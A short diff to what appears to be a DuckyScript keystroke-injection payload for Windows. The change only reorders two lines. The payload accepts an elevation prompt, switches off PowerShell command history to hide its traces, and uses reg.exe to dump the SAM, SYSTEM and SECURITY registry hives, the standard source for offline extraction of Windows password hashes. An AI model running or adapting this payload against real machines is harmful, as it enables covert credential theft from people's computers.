@@ -22,8 +22,8 @@ DELAY 2000
 ALT Y
 DELAY 2000
 STRINGLN_BLOCK
-$C = $env:SystemDrive
 Set-PSReadLineOption -HistorySaveStyle SaveNothing
+$C = $env:SystemDrive
 reg.exe save hklm\sam "$C\sam.save"
 reg.exe save hklm\system "$C\system.save"
 reg.exe save hklm\security "$C\security.save"
